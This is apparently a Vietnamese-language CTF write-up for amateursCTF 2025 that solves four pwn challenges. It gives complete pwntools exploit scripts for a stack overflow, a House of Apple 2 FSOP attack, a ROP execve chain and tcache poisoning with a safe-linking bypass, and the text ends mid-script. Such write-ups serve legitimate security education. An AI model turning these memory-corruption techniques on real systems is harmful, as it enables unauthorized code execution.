---
title: amateursCTF 2025
date: 2025-11-20 09:00 +0700
tags: [ctf, web, reversing, pwnable, crypto]
categories: [CTF Writeups]
author: ZennisKayy
math: true
image: 
  path: /assets/img/amateursCTF/banner.png
---


Dưới đây là lời giải chi tiết cho các bài CTF mình đã clear thành công. Mỗi bài viết là một trải nghiệm và những kiến thức mới mà mình đã đúc kết được.

## **Pwn**

### **easy-bof**

Đây là một thử thách pwn cơ bản, mục tiêu là khai thác lỗ hổng tràn bộ đệm (Buffer Overflow) cổ điển để chiếm quyền điều khiển luồng thực thi của chương trình và nhận được shell.

#### **Reconnaissance**

Bước đầu tiên luôn là tìm hiểu về file binary được cung cấp. Chúng ta sẽ sử dụng hai công cụ cơ bản: `file` và `checksec`.

*   **Kiểm tra loại file:**
    ```bash
    $ file chal
    chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
    ```
    Thông tin quan trọng:
    *   `ELF 64-bit LSB executable`: File thực thi 64-bit. Điều này có nghĩa là các địa chỉ và con trỏ có kích thước 8 bytes.
    *   `not stripped`: File không bị xóa các symbol (tên hàm, tên biến). Điều này giúp chúng ta dễ dàng tìm địa chỉ của các hàm cần thiết, như hàm `win`.

*   **Kiểm tra các cơ chế bảo vệ:**
    ```bash
    $ checksec --file chal
    [*] '/path/to/chal'
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        No PIE (0x400000)
    ```
    Đây là bước quan trọng nhất, nó quyết định chiến lược khai thác của chúng ta:
    *   `Stack: No canary found`: **Không có Stack Canary!** Đây là "đèn xanh" cho một cuộc tấn công buffer overflow. Stack Canary là một giá trị ngẫu nhiên được đặt trên stack để phát hiện tràn bộ đệm. Vì không có nó, chúng ta có thể ghi đè lên địa chỉ trả về mà không bị phát hiện.
    *   `PIE: No PIE (0x400000)`: **PIE (Position-Independent Executable) bị vô hiệu hóa.** Điều này có nghĩa là địa chỉ của chương trình và các hàm của nó sẽ không thay đổi mỗi khi được chạy lại. Chúng ta có thể lấy địa chỉ của hàm `win` một cách tĩnh và tin cậy.
    *   `NX: NX enabled`: Ngăn chặn việc thực thi mã trên stack. Chúng ta không thể tiêm shellcode vào stack và nhảy tới đó, nhưng điều này không thành vấn đề vì chương trình đã cung cấp sẵn cho chúng ta một hàm `win()` để lấy shell.

#### **Phân tích mã nguồn**

Mã nguồn của `chal.c` khá đơn giản:

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
  system("sh");
}

int main() {
  char buf[0x100]; // Buffer có kích thước 256 bytes
  size_t size;

  setbuf(stdout, NULL);

  printf("how much would you like to write? ");
  scanf("%ld", &size); // Nhận vào một con số
  getchar();
  fgets(buf, size, stdin); // Đọc 'size' byte vào buffer
}
```

**Lỗ hổng:**
Lỗ hổng nằm ở việc chương trình cho phép người dùng kiểm soát hoàn toàn biến `size` thông qua `scanf`. Mặc dù `buf` chỉ có kích thước `0x100` (256 bytes), người dùng có thể nhập một giá trị `size` lớn hơn 256. Khi hàm `fgets(buf, size, stdin)` được gọi với `size > 256`, nó sẽ ghi dữ liệu vượt ra ngoài phạm vi của `buf`, gây ra lỗi tràn bộ đệm trên stack.

#### **Xây dựng chiến lược khai thác**

Dựa trên các phân tích trên, chiến lược của chúng ta rất rõ ràng:
1.  Gửi một giá trị `size` lớn hơn 256.
2.  Gửi một chuỗi payload được chế tạo đặc biệt.
3.  Payload này sẽ lấp đầy buffer `buf`, sau đó ghi đè lên các dữ liệu khác trên stack cho đến khi nó ghi đè lên **địa chỉ trả về (return address)** của hàm `main`.
4.  Chúng ta sẽ thay thế địa chỉ trả về mặc định bằng địa chỉ của hàm `win()`.
5.  Khi hàm `main` kết thúc, thay vì quay trở lại vị trí bình thường, nó sẽ nhảy đến hàm `win()`, và chúng ta sẽ có shell.

Để thực hiện, chúng ta cần hai thông tin:
1.  **Địa chỉ của hàm `win()`**.
2.  **Offset**: Khoảng cách (số byte) từ đầu buffer `buf` đến địa chỉ trả về trên stack.

#### **Các bước khai thác chi tiết**

##### **Bước 1: Tìm địa chỉ hàm `win()`**

Vì PIE bị vô hiệu hóa và file không bị stripped, ta có thể dùng `objdump` hoặc GDB.
```bash
$ objdump -d chal | grep win
0000000000401176 <win>:
```
Địa chỉ của hàm `win()` là `0x401176`.

##### **Bước 2: Tìm Offset**

Đây là bước quan trọng nhất. Chúng ta sẽ sử dụng GDB và một chuỗi ký tự duy nhất (cyclic pattern) để tìm offset một cách chính xác.

1.  **Khởi động GDB với GEF (hoặc Pwndbg):**
    ```bash
    $ gdb ./chal
    ```
2.  **Tạo một chuỗi pattern:** Bên trong GDB, yêu cầu GEF tạo một chuỗi dài (ví dụ 300 bytes) và copy nó.
    ```
    gef➤ pattern create 300
    [+] Generating a pattern of 300 bytes
    ... (một chuỗi dài sẽ hiện ra, hãy copy nó) ...
    ```
3.  **Chạy chương trình:**
    ```
    gef➤ run
    ```
4.  **Tương tác với chương trình:**
    *   Khi chương trình hỏi `how much would you like to write?`, nhập `300` và nhấn Enter.
    *   Chương trình sẽ đợi. Bây giờ hãy dán chuỗi pattern bạn đã copy ở trên vào và nhấn Enter.

5.  **Phân tích crash:** Chương trình sẽ bị crash với lỗi `Segmentation fault`. GDB sẽ dừng lại ngay tại thời điểm crash. Nhìn vào các thanh ghi, bạn sẽ thấy `rip` (Instruction Pointer) đã bị ghi đè bởi một phần của chuỗi pattern.
    ```
    $rip   : 0x6261616161616168 ("haaaaaab"?)
    ```

6.  **Tìm offset tự động:** Yêu cầu GEF tìm kiếm giá trị đã ghi đè vào `rip` (hoặc đơn giản là tìm kiếm trên stack tại con trỏ `$rsp`).
    ```
    gef➤ pattern search $rsp
    [+] Searching for '...'
    [+] Found at offset 264 (little-endian search) likely
    ```
    GEF cho chúng ta biết offset chính xác là **264**.

#### **Script exploit**

Bây giờ chúng ta đã có đủ mọi thứ:
*   **Địa chỉ `win`**: `0x401176`
*   **Offset**: `264`

Chúng ta sẽ viết một script Python sử dụng thư viện `pwntools` để tự động hóa quá trình này.

**Cấu trúc payload:**
```
[ 264 bytes đệm (padding) ] [ 8 bytes địa chỉ của hàm win() ]
```

**Script `solve.py`:**
```python
from pwn import *

# Cài đặt ngữ cảnh cho file binary (arch, os, etc.)
elf = context.binary = ELF('./chal')

# Bắt đầu một tiến trình mới để chạy file binary cục bộ
# Để kết nối tới server từ xa, dùng: p = remote('hostname', port)
p = process()

# Địa chỉ của hàm win() chúng ta đã tìm thấy
win_addr = 0x401176

# Offset từ đầu buffer đến địa chỉ trả về
offset = 264

# Xây dựng payload
# b'A' * offset: Tạo ra 264 byte đệm, ký tự 'A' được dùng cho dễ nhìn.
# p64(win_addr): Đóng gói địa chỉ 64-bit của hàm win thành 8 bytes theo định dạng little-endian.
payload = b'A' * offset + p64(win_addr)

# Gửi độ dài của payload để trả lời câu hỏi "how much"
p.sendlineafter(b'how much would you like to write? ', str(len(payload)).encode())

# Gửi payload chính để gây tràn bộ đệm và ghi đè địa chỉ trả về
p.sendline(payload)

# Chuyển sang chế độ tương tác để chúng ta có thể điều khiển shell
p.interactive()
```

> Flag: `amateursCTF{some_easy_bof_for_you}`
{: .prompt-flag }

Thử thách `easy-bof` là một ví dụ kinh điển về lỗ hổng tràn bộ đệm. Việc khai thác thành công dựa vào việc thiếu hai cơ chế bảo vệ quan trọng là **Stack Canary** và **PIE**, cho phép kẻ tấn công dễ dàng ghi đè lên địa chỉ trả về bằng một địa chỉ được kiểm soát. Việc sử dụng các công cụ như GDB với GEF/Pwndbg và `pwntools` giúp quá trình tìm offset và viết mã khai thác trở nên hiệu quả và chính xác.

### **Crazy FSOP**

#### Phân tích sơ bộ

Đầu tiên, ta kiểm tra các cơ chế bảo vệ của file binary (`chal`):

```bash
checksec chal
# Arch:     amd64-64-little
# RELRO:    Full RELRO      <- Không thể ghi đè GOT table.
# Stack:    Canary found    <- Không thể Buffer Overflow trên stack.
# NX:       NX enabled      <- Không thể thực thi shellcode trên stack/heap.
# PIE:      PIE enabled     <- Địa chỉ code thay đổi mỗi lần chạy.
```
**Nhận xét:** Mọi cơ chế bảo vệ đều bật. Chúng ta cần leak địa chỉ bộ nhớ để vượt qua PIE và ASLR (Libc).

##### Đọc Source Code (Code Review)

Chương trình là một trình quản lý ghi chú đơn giản với mảng toàn cục `notes`.

```c
#define MAX_NOTES (0x10)
char *notes[MAX_NOTES]; // Mảng chứa con trỏ, nằm ở vùng .bss

// ... trong vòng lặp main ...
printf("which note: ");
if (scanf("%d", &idx) != 1) goto done; // <--- LỖI Ở ĐÂY
```

**Lỗ hổng (The Bug):**
Chương trình cho phép nhập `idx` (index) là một số nguyên (`int`), nhưng **không kiểm tra xem `idx` có âm hay không**.
*   Trong C, `notes[idx]` thực chất là truy cập vào địa chỉ `&notes + (idx * 8)`.
*   Nếu `idx` âm, ta có thể truy cập vào vùng nhớ **phía trước** mảng `notes`.

Trong bộ nhớ (vùng `.bss`), các biến thường được sắp xếp gần nhau. Các con trỏ file chuẩn như `stdout`, `stdin`, `stderr` thường nằm ngay trước mảng `notes`.

**Khả năng khai thác:**
1.  **OOB Read (View):** Đọc dữ liệu ở vùng nhớ trước `notes` (giúp leak địa chỉ).
2.  **OOB Write (Create):** Ghi đè con trỏ ở vùng nhớ trước `notes` (giúp chiếm quyền điều khiển).

---

#### Chiến thuật khai thác

Để lấy shell, ta cần thực hiện 3 bước:

1.  **Leak PIE:** Tìm địa chỉ cơ sở của chương trình để biết mảng `notes` đang nằm ở đâu.
2.  **Leak Libc:** Tìm địa chỉ thư viện C để gọi hàm `system("/bin/sh")`.
3.  **FSOP Attack:** Ghi đè con trỏ `stdout` để kích hoạt shell.

---

#### Deep Dive

##### Bước 1: Leak PIE (Địa chỉ chương trình)

Khi PIE bật, địa chỉ của mảng `notes` thay đổi liên tục. Tuy nhiên, offset (khoảng cách) giữa các biến là cố định.
Bằng cách thử nghiệm (fuzzing) hoặc debug, ta phát hiện tại **Index -7**, chương trình in ra một địa chỉ nằm trong vùng code của binary.

*   `view(-7)`: Chương trình in nội dung tại `notes[-7]`.
*   Lấy giá trị đó trừ đi offset cố định (`0x4008`), ta tìm được **PIE Base**.
*   Biết PIE Base -> Ta biết chính xác địa chỉ mảng `notes`.

##### Bước 2: Leak Libc (Heap Unsorted Bin)

Ta cần địa chỉ Libc để dùng hàm `system`. Vì không tìm thấy con trỏ Libc nào dễ đọc xung quanh `notes`, ta dùng kỹ thuật **Heap Reuse**.

**Lý thuyết:**
*   Khi ta `malloc` một vùng nhớ lớn (ví dụ 0x500 bytes) rồi `free` nó, vùng nhớ này không bị xóa trắng mà được đưa vào danh sách **Unsorted Bin** của Libc.
*   Để quản lý danh sách này, Libc ghi 2 con trỏ vào đầu vùng nhớ vừa free: `fd` (forward) và `bk` (backward).
*   Hai con trỏ này trỏ ngược về **Main Arena** (một vùng bên trong Libc).

**Thực hiện:**
1.  **Create(0, 0x500):** Tạo chunk A.
2.  **Create(1, 0x20):** Tạo chunk B (làm rào chắn để chunk A không bị gộp vào vùng trống lớn nhất).
3.  **Delete(0):** Free chunk A. Lúc này, 16 byte đầu của chunk A chứa địa chỉ Libc.
4.  **Create(0, 0x500, "CCCCCCCC"):** Cấp phát lại chunk A. Ta ghi đè 8 byte đầu (`fd`) bằng chữ "C", nhưng **giữ nguyên 8 byte sau** (`bk` - chính là địa chỉ Libc).
5.  **View(0):** In nội dung chunk A. Ta nhận được "CCCCCCCC" + [Địa chỉ Libc].

Từ địa chỉ này, ta trừ đi offset cố định (tính bằng `readelf` trên file `libc.so.6` đề cho) để ra **Libc Base**.

##### Bước 3: Tấn công FSOP (House of Apple 2)

Đây là phần khó nhất nhưng thú vị nhất.

**FSOP là gì?**
FSOP (File Stream Oriented Programming) là kỹ thuật tấn công vào cấu trúc `FILE` (như `stdout`). Khi bạn gọi `puts` hay `printf`, chương trình sẽ dùng con trỏ `stdout` để xử lý. Nếu ta ghi đè con trỏ này thành một cấu trúc giả (Fake FILE) do ta kiểm soát, ta có thể điều hướng luồng thực thi.

**Mục tiêu:** Ghi đè `stdout` (nằm ở **Index -4**) trỏ tới Fake FILE của ta.

**Kỹ thuật House of Apple 2:**
Đây là kỹ thuật mạnh mẽ trên Glibc đời mới. Nó lợi dụng hàm `_IO_wfile_overflow`. Chuỗi gọi hàm như sau:
1.  Chương trình gọi `puts`.
2.  `puts` thấy `stdout` bị thay đổi, nó gọi hàm trong bảng ảo (vtable) giả của ta.
3.  Ta trỏ vtable về `_IO_wfile_jumps` (có sẵn trong Libc).
4.  Hàm này gọi tiếp `_IO_wdoalloc`.
5.  `_IO_wdoalloc` gọi hàm tại `vtable + 0x68` với tham số là chính con trỏ FILE.
6.  Ta set `vtable + 0x68` thành `system`.
7.  Kết quả: `system(fp)`. Vì đầu chunk FILE ta để chuỗi `"  sh;"`, nó sẽ chạy lệnh `sh`.

**Setup thông minh:**
Thay vì tạo Fake Vtable trên Heap (cần leak Heap address), ta dùng mảng `notes` trong PIE (đã biết địa chỉ).
*   Ta trỏ `_wide_data` của Fake FILE về đầu mảng `notes`.
*   Theo cấu trúc, chương trình sẽ tìm vtable tại offset `0xe0` của `_wide_data`.
*   `0xe0` tương ứng với `notes[28]` (vì 28 * 8 = 224 = 0xe0).
*   Ta dùng lệnh `create(28)` để ghi địa chỉ `fake_vtable` vào `notes[28]`.

---

#### Code Exploit

Dưới đây là code Python dùng thư viện `pwntools` để tự động hóa quá trình tấn công.

```python
from pwn import *

# --- CẤU HÌNH ---
exe = ELF('./chal')
libc = ELF('./libc.so.6')

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

# OFFSET QUAN TRỌNG: Tính bằng cách lấy địa chỉ main_arena trong libc.so.6 + 96
# Dùng lệnh: readelf -s libc.so.6 | grep main_arena
# Kết quả: 0x234ac0 + 0x60 = 0x234b20
LIBC_OFFSET = 0x234b20 

# Kết nối tới server
r = remote("amt.rs", 26797)

# --- CÁC HÀM TƯƠNG TÁC (HELPERS) ---
# Hàm tạo note (ghi đè)
def create(idx, size, data):
    if isinstance(data, str): data = data.encode()
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(idx).encode())  # Gửi index (có thể âm)
    r.sendlineafter(b': ', hex(size).encode()) # Gửi kích thước
    r.sendafter(b': ', data)                   # Gửi dữ liệu (dùng sendafter để không thừa \n)

# Hàm xóa note
def delete(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

# Hàm xem note (đọc dữ liệu)
def view(idx):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

log.info("=== BẮT ĐẦU KHAI THÁC ===")

# --- BƯỚC 1: LEAK PIE ---
# Đọc index -7 để lấy địa chỉ code
view(-7)
r.recvuntil(b'data: ')
pie_leak = u64(r.recvline()[:-1][:8].ljust(8, b'\0')) # Unpack 8 byte

# Tính PIE Base từ leak (0x4008 là offset tìm được qua debug)
pie_base = pie_leak - 0x4008
if pie_base & 0xfff != 0: pie_base = pie_leak & ~0xfff # Align trang nhớ
exe.address = pie_base
log.success(f"PIE Base: {hex(pie_base)}")

# --- BƯỚC 2: LEAK LIBC (HEAP REUSE) ---
# 1. Tạo chunk lớn (0x500) để khi free sẽ vào Unsorted Bin
create(0, 0x500, b"A"*0x10)
# 2. Tạo chunk nhỏ (0x20) để chặn chunk 0 không bị gộp vào top heap
create(1, 0x20, b"B"*0x10)
# 3. Free chunk 0 -> Libc ghi địa chỉ main_arena vào đây
delete(0)
# 4. Alloc lại chunk 0. Chỉ ghi đè 8 byte đầu, giữ nguyên 8 byte sau (Libc ptr)
create(0, 0x500, b"C"*8) 

# 5. Đọc chunk 0 để lấy leak
view(0)
r.recvuntil(b'data: ')
d = r.recvline()[:-1]

if len(d) > 8:
    # Lấy 8 byte sau chuỗi "CCCCCCCC"
    heap_leak = u64(d[8:16].ljust(8, b'\0'))
    log.info(f"Raw Heap Leak: {hex(heap_leak)}")
    
    # Tính Libc Base
    libc.address = heap_leak - LIBC_OFFSET
    log.success(f"Libc Base: {hex(libc.address)}")
else:
    log.error("Leak thất bại!")

# --- BƯỚC 3: TẤN CÔNG (HOUSE OF APPLE 2) ---
system = libc.sym['system']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
notes_addr = pie_base + 0x4040 # Địa chỉ mảng notes trong PIE

# 1. Chuẩn bị Fake Vtable
# Ta dùng notes[28] làm nơi chứa pointer fake vtable
# Vtable giả này có entry tại offset 0x68 trỏ về system
fake_vtable = fit({0x68: system}, filler=b'\x00')
create(28, 0x100, fake_vtable)

# 2. Chuẩn bị Payload đè stdout (Index -4)
# Cấu trúc Fake FILE đặc biệt để trigger system("/bin/sh")
payload = fit({
    0x00: b'  sh;',          # Flags (đồng thời là lệnh shell "  sh;")
    0x28: 1,                 # _IO_write_ptr > _IO_write_base (Trigger flush)
    0x88: notes_addr,        # _lock (Trỏ vào vùng ghi được để tránh crash)
    0xa0: notes_addr,        # _wide_data (Trỏ vào mảng notes)
    0xd8: _IO_wfile_jumps,   # vtable chuẩn để bypass check ban đầu
}, filler=b'\x00').ljust(0x100, b'\0')

log.info("Ghi đè stdout...")
create(-4, 0x400, payload)

# 3. Kích hoạt shell
# Lần gọi hàm IO tiếp theo (puts/printf) sẽ kích hoạt fake vtable -> system("  sh;")
r.sendline(b'id; cat flag.txt')
r.interactive()
```

> Flag: `amateursCTF{libc_is_just_weird_sometimes}`
{: .prompt-flag }

---

#### Key Takeaways

Qua bài này, một newbie có thể học được:
1.  **Mảng trong C không an toàn:** Nếu không kiểm tra chỉ số âm, ta có thể truy cập vùng nhớ quan trọng nằm trước mảng.
2.  **Heap rất hữu ích:** Không chỉ dùng để lưu dữ liệu, Heap còn chứa các con trỏ nội bộ của Libc (Unsorted Bin) giúp ta bypass ASLR.
3.  **FSOP là "Vua" của user-space pwn:** Khi bạn kiểm soát được `stdout` hoặc `stdin`, bạn gần như kiểm soát được luồng thực thi của chương trình mà không cần stack overflow.
4.  **Tầm quan trọng của Debug:** Việc tính toán offset (`-4`, `-7`, `LIBC_OFFSET`) bằng GDB và `readelf` là bước quan trọng nhất để exploit chạy đúng.

---

### **Rewrite It In Zig**

**Category:** Pwn
**Language:** Zig
**Technique:** Static Binary Exploitation, ROP (Return Oriented Programming), Ret-2-Syscall (via Wrapper).

#### Reconnaissance

##### Source Code Analysis
Đoạn code Zig được cung cấp rất ngắn gọn nhưng chứa một lỗi nghiêm trọng về quản lý bộ nhớ thủ công:

```zig
var backing: [0x100]u8 = undefined; // Cấp phát 256 bytes trên Stack
var buf: []u8 = &backing;           // Tạo slice trỏ vào mảng đó
buf.len = 0x1000;                   // LỖI: Tự ý mở rộng độ dài slice lên 4096 bytes
_ = std.io.getStdIn().read(buf) catch {}; // Đọc tràn mảng backing
```
*   **Lỗ hổng:** Stack Buffer Overflow. Chương trình cho phép nhập tới 4096 byte vào một vùng nhớ thực tế chỉ có 256 byte.
*   **Hậu quả:** Ghi đè được Return Address của hàm `main`.

##### Checksec & Binary Info
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
Type:     Statically Linked
```
*   **Statically Linked:** Binary chứa toàn bộ code thư viện (file rất nặng), không phụ thuộc `libc` bên ngoài.
*   **No PIE:** Địa chỉ code và data là cố định (dễ dàng dùng ROP).
*   **No Canary:** Có thể overflow thoải mái mà không bị crash ngay lập tức.
*   **NX Enabled:** Không thể thực thi shellcode trên stack -> Phải dùng ROP.

#### Exploitation Strategy

Vì không có hàm `system` hay chuỗi `/bin/sh` lộ rõ, chúng ta phải dùng **ROP** để gọi trực tiếp **Syscall**. Mục tiêu là thực hiện:
`execve("/bin/sh", 0, 0)`

**Các bước thực hiện:**
1.  **Ghi chuỗi `/bin/sh` vào bộ nhớ:** Tìm một vùng nhớ có quyền ghi (`RW`) và địa chỉ cố định (ví dụ `.bss`). Gọi syscall `read(0, rw_address, size)` để nhập chuỗi này vào.
2.  **Lấy Shell:** Gọi syscall `execve(rw_address, 0, 0)`.

**Vấn đề phát sinh:**
Do binary được biên dịch từ Zig (Static), các gadget `pop rdi; ret` hay `syscall; ret` sạch sẽ (clean gadgets) rất khó tìm hoặc không tồn tại.
**Giải pháp:** Tận dụng các hàm wrapper có sẵn trong binary. Cụ thể là hàm `os.linux.x86_64.syscall3` (được Zig dùng để gọi syscall).

#### Walkthrough

##### Bước 1: Tìm Offset
Sử dụng GDB và Pattern Create:
*   Tạo pattern 1000 ký tự.
*   Gây crash và tìm offset tại `RSP`.
*   **Kết quả:** Offset = **360**.

##### Bước 2: Tìm địa chỉ vùng nhớ ghi được (RW Section)
Sử dụng `vmmap` trong GDB để tìm vùng nhớ có quyền `rw-` và địa chỉ tĩnh.
*   **Chọn địa chỉ:** `0x010d6100` (Nằm trong segment data/bss).

##### Bước 3: Tìm Gadget & Hàm Syscall Wrapper
Thay vì tìm lệnh `syscall` đơn lẻ, ta tìm hàm `os.linux.x86_64.syscall3`.
*   Địa chỉ lệnh `syscall` bên trong hàm này: `0x1076649`.
*   Đặc điểm hàm này: Sau khi `syscall`, nó thực hiện `add rsp, 0x38; pop rbp; ret`.
    *   => **Lưu ý:** Cần padding `56 + 8 = 64 bytes` sau mỗi lần gọi gadget này để stack không bị lệch.

Tìm các gadget để set thanh ghi (dùng `ROPgadget` và `search -b` trong GDB):
*   `pop rax; ret`: `0x10c5cc4`
*   `pop rdx; ret`: `0x10cf9ec`
*   `pop rdi; pop rbp; ret`: `0x1050fc0` (Gadget bẩn, cần padding rbp)
*   `pop rsi; pop rbp; ret`: `0x104a153` (Gadget bẩn, cần padding rbp)

#### Script Exploit

```python
from pwn import *

# exe = ELF('./chal')
# context.binary = exe
# p = process('./chal')
p = remote('amt.rs', 27193)

# --- OFFSET & ADDRESS ---
offset = 360
rw_section = 0x010d6100      # Vùng nhớ để ghi "/bin/sh"

# --- GADGETS ---
pop_rax = 0x00000000010c5cc4
pop_rdx = 0x00000000010cf9ec

# Gadget: pop rdi ; pop rbp ; ret
pop_rdi_rbp = 0x0000000001050fc0 

# Gadget: pop rsi ; pop rbp ; ret (Vừa tìm thấy)
pop_rsi_rbp = 0x000000000104a153 

# Địa chỉ lệnh syscall nằm trong hàm os.linux.x86_64.syscall3
# Lưu ý: Sau lệnh syscall này là 'add rsp, 0x38; pop rbp; ret'
# Nên ta cần padding 56 bytes + 8 bytes = 64 bytes sau mỗi lần gọi syscall
syscall_addr = 0x0000000001076649

# --- TẠO PAYLOAD ---
payload = b"A" * offset

# =========================================================
# GIAI ĐOẠN 1: read(0, rw_section, 59)
# =========================================================

# 1. Set RDI = 0 (stdin)
payload += p64(pop_rdi_rbp)
payload += p64(0)            # rdi
payload += p64(0)            # rbp (rác)

# 2. Set RSI = rw_section (buffer)
payload += p64(pop_rsi_rbp)
payload += p64(rw_section)   # rsi
payload += p64(0)            # rbp (rác)

# 3. Set RDX = 59 (độ dài)
payload += p64(pop_rdx)
payload += p64(59)

# 4. Set RAX = 0 (syscall read)
payload += p64(pop_rax)
payload += p64(0)

# 5. Gọi Syscall
payload += p64(syscall_addr)
# Padding để xử lý stack cleanup của hàm syscall3 (add rsp, 0x38; pop rbp)
payload += b"P" * (0x38 + 8) 

# =========================================================
# GIAI ĐOẠN 2: execve(rw_section, 0, 0)
# =========================================================

# 1. Set RDI = rw_section (ptr to "/bin/sh")
payload += p64(pop_rdi_rbp)
payload += p64(rw_section)   # rdi
payload += p64(0)            # rbp (rác)

# 2. Set RSI = 0
payload += p64(pop_rsi_rbp)
payload += p64(0)            # rsi
payload += p64(0)            # rbp (rác)

# 3. Set RDX = 0
payload += p64(pop_rdx)
payload += p64(0)

# 4. Set RAX = 59 (syscall execve)
payload += p64(pop_rax)
payload += p64(59)

# 5. Gọi Syscall (Lấy shell!)
payload += p64(syscall_addr)

print("[*] Sending ROP Chain...")
try:
    p.recvuntil(b"pwn.\n")
except:
    pass

p.send(payload)

time.sleep(0.5)

print("[*] Sending /bin/sh...")
p.send(b"/bin/sh\0")

# Tương tác
p.interactive()
```

> Flag: `amateursCTF{i_love_zig_its_my_favorite_language_and_you_will_never_escape_the_zig_pwn_ahahaha}`
{: .prompt-flag }

#### Key Takeaways

1.  **Zig Slices:** Trong Zig, slice gồm con trỏ và độ dài. Việc ghi đè độ dài (`len`) của slice thủ công là cực kỳ nguy hiểm và dẫn đến OOB R/W.
2.  **Static Binary:** Với file static, không cần leak libc. Mọi gadget đều nằm trong file. Tuy nhiên, gadget thường "bẩn" (làm nhiều việc hơn mong muốn).
3.  **Syscall Wrapper:** Khi không tìm thấy gadget `syscall; ret` sạch, hãy tìm các hàm wrapper có sẵn trong binary (như `os.linux...`). Nhưng phải chú ý cách hàm đó xử lý stack (prologue/epilogue) để padding cho đúng.
4.  **RW Section:** Trong ROP, nếu cần chuỗi ký tự (như `/bin/sh`), hãy tìm vùng nhớ `.bss` hoặc `.data` để ghi vào thay vì cố gắng đẩy lên stack (khó đoán địa chỉ).

### **Easy Heap**

**Category:** Pwn
**Technique:** Heap Exploitation, Use-After-Free (UAF), Tcache Poisoning, Glibc Safe Linking Bypass.

#### Reconnaissance

##### Checksec file
```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE
```
*   **No PIE:** Đây là điểm yếu chí mạng. Địa chỉ của mã lệnh và các biến toàn cục (Global Variables) là cố định. Chúng ta không cần leak địa chỉ nền của file (Binary Base).
*   **Full RELRO:** Không thể ghi đè bảng GOT (Global Offset Table).
*   **Heap:** Do đề bài sử dụng Ubuntu đời mới (24.04/25.10), Glibc sẽ là phiên bản > 2.32. Điều này đồng nghĩa với việc có cơ chế bảo vệ **Safe Linking** (Mã hóa con trỏ trong Tcache).

##### Reverse Engineering
Chương trình là một menu quản lý Heap cơ bản với các chức năng:
1.  **Alloc (0):** `malloc(0x67)`.
2.  **Free (1):** `free(ptr)`.
3.  **Edit (2):** `read(0, ptr, 0x67)` - Ghi dữ liệu vào chunk.
4.  **View (3):** `write(1, ptr, 0x67)` - In dữ liệu trong chunk.
5.  **Check (67):** Kiểm tra biến toàn cục `checkbuf`. Nếu `checkbuf` chứa chuỗi `"ALL HAIL OUR LORD AND SAVIOR TEEMO"` thì gọi `system("sh")`.

**Lỗ hổng (Vulnerability):**
Lỗi **Use-After-Free (UAF)** xảy ra ở chức năng `Free`. Sau khi giải phóng bộ nhớ, chương trình **không xóa con trỏ** trong mảng quản lý.
-> Chúng ta vẫn có thể `Edit` (Ghi) và `View` (Đọc) một chunk đã bị free.

#### Exploitation Strategy

Mục tiêu là ghi đè chuỗi magic vào biến toàn cục `checkbuf`. Vì `checkbuf` không nằm trên Heap, ta cần lừa `malloc` trả về địa chỉ của `checkbuf`.

Kỹ thuật sử dụng: **Tcache Poisoning**.
1.  Đưa một chunk vào Tcache.
2.  Sử dụng lỗi UAF để ghi đè con trỏ `next` (fd pointer) của chunk đó thành địa chỉ `checkbuf`.
3.  `malloc` 2 lần: Lần 1 lấy chunk rác, lần 2 sẽ lấy được chunk ngay tại `checkbuf`.

**Trở ngại (Safe Linking):**
Trên Glibc mới, con trỏ `fd` trong Tcache được mã hóa bằng công thức:
$$ \text{Stored\_Ptr} = (\text{Address} \gg 12) \oplus \text{Next\_Ptr} $$
Để ghi đè `Next_Ptr` thành địa chỉ mình muốn, ta cần biết `(Address >> 12)` (gọi là **Key**).

#### Walkthrough

##### Bước 1: Leak Heap Key (Bypass Safe Linking)
*   **Hành động:** Alloc một chunk (Chunk 0) và Free nó.
*   **Trạng thái Tcache:** `Head -> Chunk 0 -> NULL`.
*   **Tại Chunk 0:** Con trỏ `fd` sẽ lưu giá trị: `(Chunk0_Addr >> 12) ^ NULL`.
*   **Khai thác:** Dùng chức năng `View(0)` (UAF Read) để đọc giá trị này. Do XOR với 0 vẫn là chính nó, ta thu được `Key = (Chunk0_Addr >> 12)`.

```python
# Code tương ứng trong script
alloc(0)
free(0)
leak_data = view(0)
heap_key = u64(leak_data[:8].ljust(8, b'\0'))
```

##### Bước 2: Tcache Poisoning (Ghi đè FD)
*   **Mục tiêu:** Muốn `malloc` trả về địa chỉ `checkbuf` (0x404040).
*   **Tính toán:** Ta cần ghi vào `fd` của Chunk 0 giá trị giả mạo (Fake FD) sao cho khi Glibc giải mã, nó ra địa chỉ `checkbuf`.
    $$ \text{Fake\_FD} = \text{Key} \oplus \text{Address\_Checkbuf} $$
*   **Hành động:** Dùng `Edit(0)` (UAF Write) để ghi `Fake_FD` vào 8 byte đầu của Chunk 0.

```python
# Code tương ứng
fake_fd = heap_key ^ checkbuf_addr
edit(0, p64(fake_fd))
```

##### Bước 3: Alloc Arbitrary Address (Lấy vùng nhớ mục tiêu)
*   **Alloc(1):** Lấy Chunk 0 ra khỏi Tcache. Glibc sẽ giải mã `fd` của Chunk 0 để cập nhật Tcache Head.
    *   Tcache Head bây giờ trỏ tới: `checkbuf`.
*   **Alloc(2):** Lấy chunk tiếp theo trong Tcache -> Chính là địa chỉ `checkbuf`!

```python
alloc(1) # Lấy chunk rác
alloc(2) # Lấy được checkbuf
```

##### Bước 4: Ghi đè và Lấy Shell
*   Bây giờ Chunk 2 đang quản lý vùng nhớ tại `checkbuf`.
*   Dùng `Edit(2)` để ghi chuỗi `"ALL HAIL OUR LORD AND SAVIOR TEEMO"`.
*   Gọi chức năng `Check (67)` để kích hoạt `system("sh")`.

```python
magic_string = b"ALL HAIL OUR LORD AND SAVIOR TEEMO"
edit(2, magic_string)
trigger_check()
```

#### Full Exploit Script

```python
from pwn import *

